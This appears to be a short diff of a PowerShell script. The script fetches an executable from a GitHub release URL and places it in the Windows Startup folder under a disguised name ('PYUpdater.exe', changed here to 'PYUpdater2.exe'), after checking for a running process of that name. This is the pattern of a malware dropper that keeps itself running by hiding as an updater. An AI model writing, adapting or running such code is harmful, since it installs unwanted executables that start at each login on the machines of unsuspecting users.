@@ -39,7 +39,7 @@ if ($process) {
 
 $url = "https://github.com/HadronCollsion/Chuha/releases/download/v1.0/release.exe"
 $dest = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-$fn = "PYUpdater.exe"
+$fn = "PYUpdater2.exe"
 $fp = Join-Path -Path $dest -ChildPath $fn
 
 if (Get-Process -Name "PYUpdater" -ErrorAction SilentlyContinue) {
